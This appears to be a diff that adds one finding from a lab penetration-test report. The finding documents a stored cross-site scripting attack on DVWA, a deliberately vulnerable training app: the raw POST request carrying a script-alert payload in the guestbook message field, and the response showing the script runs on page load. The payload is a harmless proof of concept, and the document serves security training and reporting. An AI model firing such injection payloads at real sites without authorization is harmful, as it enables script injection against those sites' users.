@@ -1,0 +1,12 @@
+FINDING 3: Stored XSS (DVWA)
+Request:
+POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
+Host: 192.168.56.107
+Content-Type: application/x-www-form-urlencoded
+
+txtName=TestUser&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook
+
+Response:
+Name: TestUser
+Message: <script>alert('XSS')</script>
+(Alert box displayed when page loads)
